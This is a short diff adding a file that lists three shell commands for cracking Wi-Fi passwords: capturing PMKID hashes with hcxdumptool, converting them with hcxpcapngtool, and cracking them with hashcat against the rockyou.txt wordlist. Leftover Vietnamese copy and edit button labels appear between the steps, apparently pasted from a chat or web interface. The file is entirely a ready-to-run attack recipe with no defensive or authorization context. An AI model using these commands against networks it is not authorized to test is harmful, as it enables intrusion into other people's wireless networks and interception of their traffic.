@@ -1,0 +1,15 @@
+1. Capture PMKID
+bash
+Sao chép
+Chỉnh sửa
+hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+2. Convert Capture
+bash
+Sao chép
+Chỉnh sửa
+hcxpcapngtool -o pmkid.22000 pmkid.pcapng
+3. Crack with Hashcat
+bash
+Sao chép
+Chỉnh sửa
+hashcat -m 22000 pmkid.22000 rockyou.txt --force
